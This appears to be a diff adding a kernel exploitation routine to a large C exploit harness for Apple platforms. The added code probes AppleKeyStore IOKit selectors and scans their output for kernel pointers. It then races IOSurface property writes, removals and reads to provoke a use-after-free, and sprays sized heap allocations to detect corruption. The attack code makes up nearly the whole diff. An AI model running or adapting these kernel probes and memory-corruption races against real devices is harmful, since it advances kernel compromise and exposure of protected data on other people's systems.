@@ -29617,6 +29617,386 @@ static void r502b_exploit(void) {
     fflush(stdout);
 }
 
+static void r504_exploit(void) {
+    rlog("\n=== r504: KeyStore data probe + IOSurface property UAF ===\n\n");
+    fflush(stdout);
+
+    /* Phase 1: AppleKeyStore deep data extraction */
+    rlog("--- Phase 1: AppleKeyStore data extraction ---\n");
+    {
+        io_service_t ks = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleKeyStore"));
+        if (!ks) { rlog("  KeyStore not found!\n"); goto ks_done; }
+
+        io_connect_t kc = 0;
+        kern_return_t kr = IOServiceOpen(ks, mach_task_self(), 0, &kc);
+        if (kr != KERN_SUCCESS || !kc) {
+            rlog("  KeyStore open failed: 0x%x\n", kr);
+            IOObjectRelease(ks);
+            goto ks_done;
+        }
+        rlog("  KeyStore conn=0x%x\n", kc);
+
+        /* Probe sels 0, 1, 16 with different input patterns */
+        int accessible_sels[] = {0, 1, 16};
+        for (int si = 0; si < 3; si++) {
+            int sel = accessible_sels[si];
+            rlog("\n  sel%d probe:\n", sel);
+
+            /* Mode A: no input, full output */
+            uint64_t sout[16] = {0};
+            uint32_t soc = 16;
+            uint8_t sbuf[512] = {0};
+            size_t ssz = 512;
+            kr = IOConnectCallMethod(kc, sel, NULL, 0, NULL, 0,
+                sout, &soc, sbuf, &ssz);
+            rlog("    noargs: kr=0x%x soc=%u ssz=%zu\n", kr, soc, ssz);
+            if (kr == KERN_SUCCESS) {
+                /* Dump scalar outputs */
+                for (uint32_t i = 0; i < soc && i < 16; i++) {
+                    if (sout[i] != 0) {
+                        rlog("    scalar[%u]=0x%llx", i, (unsigned long long)sout[i]);
+                        if (sout[i] > 0xffff800000000000ULL)
+                            rlog(" ***KPTR***");
+                        rlog("\n");
+                    }
+                }
+                /* Dump struct output — hex dump first 128 bytes */
+                if (ssz > 0) {
+                    rlog("    struct[%zu]:", ssz);
+                    for (size_t i = 0; i < ssz && i < 128; i++) {
+                        if (i % 16 == 0) rlog("\n      %04zx:", i);
+                        rlog(" %02x", sbuf[i]);
+                    }
+                    rlog("\n");
+                    /* Scan for kernel pointers */
+                    for (size_t j = 0; j + 7 < ssz; j += 4) {
+                        uint64_t v; memcpy(&v, sbuf + j, 8);
+                        if (v != 0 && v != 0xFFFFFFFFFFFFFFFFULL &&
+                            v > 0xffff800000000000ULL) {
+                            rlog("    *** KPTR off=%zu: 0x%llx ***\n",
+                                 j, (unsigned long long)v);
+                        }
+                    }
+                }
+            }
+
+            /* Mode B: with scalar inputs */
+            for (int nsc = 1; nsc <= 4; nsc++) {
+                uint64_t sin[4] = {0, 0, 0, 0};
+                soc = 16; memset(sout, 0, sizeof(sout));
+                ssz = 512; memset(sbuf, 0, 512);
+                kr = IOConnectCallMethod(kc, sel, sin, nsc, NULL, 0,
+                    sout, &soc, sbuf, &ssz);
+                if (kr == KERN_SUCCESS && (soc > 0 || ssz > 0)) {
+                    rlog("    %dsc(0): kr=0x%x soc=%u ssz=%zu sout[0]=0x%llx\n",
+                         nsc, kr, soc, ssz, (unsigned long long)sout[0]);
+                }
+            }
+
+            /* Mode C: with struct input */
+            uint8_t si_buf[128] = {0};
+            soc = 16; memset(sout, 0, sizeof(sout));
+            ssz = 512; memset(sbuf, 0, 512);
+            kr = IOConnectCallMethod(kc, sel, NULL, 0, si_buf, 64,
+                sout, &soc, sbuf, &ssz);
+            if (kr == KERN_SUCCESS && (soc > 0 || ssz > 0)) {
+                rlog("    struct64in: kr=0x%x soc=%u ssz=%zu\n", kr, soc, ssz);
+            }
+
+            /* Call twice — check if output changes (kernel state leak) */
+            uint8_t sbuf2[512] = {0};
+            size_t ssz2 = 512;
+            soc = 16; memset(sout, 0, sizeof(sout));
+            kr = IOConnectCallMethod(kc, sel, NULL, 0, NULL, 0,
+                sout, &soc, sbuf2, &ssz2);
+            if (kr == KERN_SUCCESS && ssz2 > 0 && ssz > 0) {
+                int diff = 0;
+                size_t minsz = ssz < ssz2 ? ssz : ssz2;
+                for (size_t i = 0; i < minsz; i++) {
+                    if (sbuf[i] != sbuf2[i]) diff++;
+                }
+                if (diff > 0)
+                    rlog("    *** %d BYTE DIFFS between consecutive calls! ***\n", diff);
+                else
+                    rlog("    Consecutive calls: identical (%zu bytes)\n", minsz);
+            }
+        }
+
+        /* Try connection types 1-4 */
+        for (int ct = 1; ct <= 4; ct++) {
+            io_connect_t kc2 = 0;
+            kr = IOServiceOpen(ks, mach_task_self(), ct, &kc2);
+            if (kr == KERN_SUCCESS && kc2) {
+                rlog("\n  KeyStore type=%d conn=0x%x — sel0 test:\n", ct, kc2);
+                uint64_t sout2[4] = {0};
+                uint32_t soc2 = 4;
+                uint8_t sb2[128] = {0};
+                size_t ss2 = 128;
+                kr = IOConnectCallMethod(kc2, 0, NULL, 0, NULL, 0,
+                    sout2, &soc2, sb2, &ss2);
+                rlog("    sel0: kr=0x%x soc=%u ssz=%zu sout=0x%llx\n",
+                     kr, soc2, ss2, (unsigned long long)sout2[0]);
+                IOServiceClose(kc2);
+            }
+        }
+
+        IOServiceClose(kc);
+        IOObjectRelease(ks);
+    }
+ks_done:
+    fflush(stdout);
+
+    /* Phase 2: IOSurface property UAF via heavy serialization race */
+    rlog("\n--- Phase 2: IOSurface property serialization UAF ---\n");
+    rlog("  Strategy: race SetValue(large plist) vs RemoveValue\n");
+    rlog("  OSUnserialize in kernel may access freed buffer\n\n");
+    {
+        CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int sv = 64;
+        CFNumberRef sn = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+        CFDictionarySetValue(sprops, CFSTR("IOSurfaceWidth"), sn);
+        CFDictionarySetValue(sprops, CFSTR("IOSurfaceHeight"), sn);
+        sv = 4; CFNumberRef sbn = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+        CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerElement"), sbn);
+        sv = 256; CFNumberRef sbrn = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+        CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerRow"), sbrn);
+        sv = 0x42475241; CFNumberRef spfn = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+        CFDictionarySetValue(sprops, CFSTR("IOSurfacePixelFormat"), spfn);
+
+        IOSurfaceRef surf = IOSurfaceCreate(sprops);
+        if (!surf) {
+            rlog("  Surface creation failed!\n");
+            goto p2_done;
+        }
+        rlog("  Surface id=%u\n", IOSurfaceGetID(surf));
+
+        __block int uaf_kptrs = 0;
+        __block int uaf_type_confusion = 0;
+        __block int uaf_size_anomaly = 0;
+        __block int uaf_dangling_read = 0;
+        __block volatile int p2_go = 0;
+        __block volatile int p2_stop = 0;
+
+        #define P2_UAF_ROUNDS 5000
+        #define P2_NKEYS 16
+
+        dispatch_queue_t wq = dispatch_queue_create("p2.write", DISPATCH_QUEUE_CONCURRENT);
+        dispatch_queue_t rq2 = dispatch_queue_create("p2.read", DISPATCH_QUEUE_CONCURRENT);
+
+        /* Writer threads: set large dictionary values with nested structure */
+        for (int t = 0; t < 3; t++) {
+            dispatch_async(wq, ^{
+                while (!p2_go) usleep(1);
+                for (int r = 0; r < P2_UAF_ROUNDS && !p2_stop; r++) {
+                    char keyname[32];
+                    snprintf(keyname, sizeof(keyname), "_uaf_%d", r % P2_NKEYS);
+                    CFStringRef key = CFStringCreateWithCString(NULL, keyname, kCFStringEncodingASCII);
+
+                    /* Create a nested dict to trigger complex OSUnserialize path */
+                    CFMutableDictionaryRef d = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int v = r;
+                    CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &v);
+                    CFDictionarySetValue(d, CFSTR("round"), n);
+
+                    /* Add data payload to control allocation size */
+                    uint8_t payload[128];
+                    memset(payload, 0x41 + (r % 26), 128);
+                    uint64_t marker = 0xDEAD000000000000ULL | (uint64_t)r;
+                    memcpy(payload, &marker, 8);
+                    CFDataRef data = CFDataCreate(NULL, payload, 128);
+                    CFDictionarySetValue(d, CFSTR("data"), data);
+
+                    IOSurfaceSetValue(surf, key, (CFTypeRef)d);
+                    CFRelease(d); CFRelease(n); CFRelease(data);
+
+                    /* Immediately remove — the kernel may still be processing */
+                    IOSurfaceRemoveValue(surf, key);
+                    CFRelease(key);
+                }
+            });
+        }
+
+        /* Reader threads: try to read values during race window */
+        for (int t = 0; t < 3; t++) {
+            dispatch_async(rq2, ^{
+                while (!p2_go) usleep(1);
+                for (int r = 0; r < P2_UAF_ROUNDS && !p2_stop; r++) {
+                    char keyname[32];
+                    snprintf(keyname, sizeof(keyname), "_uaf_%d", r % P2_NKEYS);
+                    CFStringRef key = CFStringCreateWithCString(NULL, keyname, kCFStringEncodingASCII);
+
+                    CFTypeRef val = IOSurfaceCopyValue(surf, key);
+                    if (val) {
+                        CFTypeID tid = CFGetTypeID(val);
+                        if (tid == CFDictionaryGetTypeID()) {
+                            CFDictionaryRef rd = (CFDictionaryRef)val;
+                            CFTypeRef dval = CFDictionaryGetValue(rd, CFSTR("data"));
+                            if (dval) {
+                                if (CFGetTypeID(dval) != CFDataGetTypeID()) {
+                                    uaf_type_confusion++;
+                                    rlog("  *** TYPE CONFUSION: 'data' field typeID=%lu ***\n",
+                                         (unsigned long)CFGetTypeID(dval));
+                                } else {
+                                    CFDataRef dd = (CFDataRef)dval;
+                                    CFIndex len = CFDataGetLength(dd);
+                                    const uint8_t *p = CFDataGetBytePtr(dd);
+                                    if (len != 128) {
+                                        uaf_size_anomaly++;
+                                        if (uaf_size_anomaly <= 5)
+                                            rlog("  *** SIZE ANOMALY: len=%d expected=128 ***\n",
+                                                 (int)len);
+                                    }
+                                    /* Check for kernel pointers in data */
+                                    for (CFIndex j = 0; j + 7 < len; j += 4) {
+                                        uint64_t v2;
+                                        memcpy(&v2, p + j, 8);
+                                        /* Filter our markers and 0xFF fill */
+                                        if ((v2 & 0xFFFF000000000000ULL) == 0xDEAD000000000000ULL)
+                                            continue;
+                                        if (v2 == 0xFFFFFFFFFFFFFFFFULL) continue;
+                                        if (v2 > 0xffff800000000000ULL) {
+                                            uaf_kptrs++;
+                                            if (uaf_kptrs <= 10)
+                                                rlog("  *** UAF KPTR off=%d: 0x%llx ***\n",
+                                                     (int)j, (unsigned long long)v2);
+                                        }
+                                    }
+                                    /* Check if marker is corrupted (dangling read) */
+                                    if (len >= 8) {
+                                        uint64_t m;
+                                        memcpy(&m, p, 8);
+                                        if ((m & 0xFFFF000000000000ULL) != 0xDEAD000000000000ULL &&
+                                            m != 0) {
+                                            uaf_dangling_read++;
+                                            if (uaf_dangling_read <= 10)
+                                                rlog("  *** DANGLING READ: marker=0x%llx ***\n",
+                                                     (unsigned long long)m);
+                                        }
+                                    }
+                                }
+                            }
+                        } else if (tid != CFDataGetTypeID() && tid != CFStringGetTypeID()) {
+                            uaf_type_confusion++;
+                            rlog("  *** ROOT TYPE CONFUSION: typeID=%lu ***\n",
+                                 (unsigned long)tid);
+                        }
+                        CFRelease(val);
+                    }
+                }
+            });
+        }
+
+        p2_go = 1;
+        dispatch_barrier_sync(wq, ^{});
+        dispatch_barrier_sync(rq2, ^{});
+        p2_stop = 1;
+
+        rlog("\n  Phase 2 results:\n");
+        rlog("    kptrs=%d type_confusion=%d size_anomaly=%d dangling_read=%d\n",
+             uaf_kptrs, uaf_type_confusion, uaf_size_anomaly, uaf_dangling_read);
+
+        CFRelease(surf);
+        CFRelease(sprops); CFRelease(sn); CFRelease(sbn);
+        CFRelease(sbrn); CFRelease(spfn);
+    }
+p2_done:
+    fflush(stdout);
+
+    /* Phase 3: IOSurface property store — controlled size spray + read-back */
+    rlog("\n--- Phase 3: Controlled size property spray + timing ---\n");
+    {
+        CFMutableDictionaryRef p3props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int p3v = 32;
+        CFNumberRef p3n = CFNumberCreate(NULL, kCFNumberIntType, &p3v);
+        CFDictionarySetValue(p3props, CFSTR("IOSurfaceWidth"), p3n);
+        CFDictionarySetValue(p3props, CFSTR("IOSurfaceHeight"), p3n);
+        p3v = 4; CFNumberRef p3bn = CFNumberCreate(NULL, kCFNumberIntType, &p3v);
+        CFDictionarySetValue(p3props, CFSTR("IOSurfaceBytesPerElement"), p3bn);
+        p3v = 128; CFNumberRef p3brn = CFNumberCreate(NULL, kCFNumberIntType, &p3v);
+        CFDictionarySetValue(p3props, CFSTR("IOSurfaceBytesPerRow"), p3brn);
+        p3v = 0x42475241; CFNumberRef p3pfn = CFNumberCreate(NULL, kCFNumberIntType, &p3v);
+        CFDictionarySetValue(p3props, CFSTR("IOSurfacePixelFormat"), p3pfn);
+
+        /* Create N surfaces and store/read values to measure timing */
+        #define P3_NSURFS 32
+        IOSurfaceRef p3s[P3_NSURFS];
+        for (int i = 0; i < P3_NSURFS; i++)
+            p3s[i] = IOSurfaceCreate(p3props);
+
+        /* Store increasing size data on each surface */
+        rlog("  Spray sizes:");
+        for (int i = 0; i < P3_NSURFS; i++) {
+            if (!p3s[i]) continue;
+            int sz = 16 * (i + 1); /* 16, 32, 48, ... 512 */
+            uint8_t *buf = calloc(1, sz);
+            memset(buf, 0x42, sz);
+            CFDataRef d = CFDataCreate(NULL, buf, sz);
+            IOSurfaceSetValue(p3s[i], CFSTR("_spray"), d);
+            CFRelease(d);
+            free(buf);
+
+            /* Read back and time it */
+            uint64_t t0 = mach_absolute_time();
+            CFTypeRef rv = IOSurfaceCopyValue(p3s[i], CFSTR("_spray"));
+            uint64_t t1 = mach_absolute_time();
+            if (rv) {
+                if (i % 8 == 0)
+                    rlog("\n    sz=%d: %llu ticks", sz, (unsigned long long)(t1 - t0));
+                CFRelease(rv);
+            }
+        }
+        rlog("\n");
+
+        /* Now free half the surfaces and read back the remaining */
+        rlog("  Freeing odd surfaces...\n");
+        for (int i = 1; i < P3_NSURFS; i += 2) {
+            if (p3s[i]) { CFRelease(p3s[i]); p3s[i] = NULL; }
+        }
+
+        /* Read back even surfaces — look for corruption from freed adjacent allocs */
+        int p3_corrupt = 0;
+        for (int i = 0; i < P3_NSURFS; i += 2) {
+            if (!p3s[i]) continue;
+            CFTypeRef rv = IOSurfaceCopyValue(p3s[i], CFSTR("_spray"));
+            if (rv && CFGetTypeID(rv) == CFDataGetTypeID()) {
+                CFDataRef d = (CFDataRef)rv;
+                const uint8_t *p = CFDataGetBytePtr(d);
+                CFIndex len = CFDataGetLength(d);
+                int expected_sz = 16 * (i + 1);
+                if (len != expected_sz) {
+                    p3_corrupt++;
+                    rlog("  *** SIZE CHANGE surf%d: got=%d expected=%d ***\n",
+                         i, (int)len, expected_sz);
+                }
+                /* Check for non-0x42 bytes (corruption from freed neighbor) */
+                for (CFIndex j = 0; j < len; j++) {
+                    if (p[j] != 0x42) {
+                        p3_corrupt++;
+                        rlog("  *** CORRUPTION surf%d off=%d: 0x%02x ***\n",
+                             i, (int)j, p[j]);
+                        break;
+                    }
+                }
+                CFRelease(rv);
+            }
+        }
+        rlog("  Corruption check: %d anomalies\n", p3_corrupt);
+
+        for (int i = 0; i < P3_NSURFS; i++)
+            if (p3s[i]) CFRelease(p3s[i]);
+        CFRelease(p3props); CFRelease(p3n); CFRelease(p3bn);
+        CFRelease(p3brn); CFRelease(p3pfn);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r504 complete ===\n\n");
+    fflush(stdout);
+}
+
 static void r498_exploit(void) {
     rlog("\n=== r498: Bitstream comparison + PropertyMode ===\n\n");
     fflush(stdout);
@@ -100316,6 +100696,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 509) {
+            rlog("*** rounds=509: KeyStore data + IOSurface property UAF ***\n\n");
+            fflush(stdout);
+            r504_exploit();
+            goto done;
+        }
         if (rounds == 508) {
             rlog("*** rounds=508: Sel 19 heap write + sels 30/37/45 deep probe ***\n\n");
             fflush(stdout);
@@ -103367,7 +103753,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 508 && rounds != 507 && rounds != 506 && rounds != 505 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 508 && rounds != 509 && rounds != 508 && rounds != 507 && rounds != 506 && rounds != 505 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
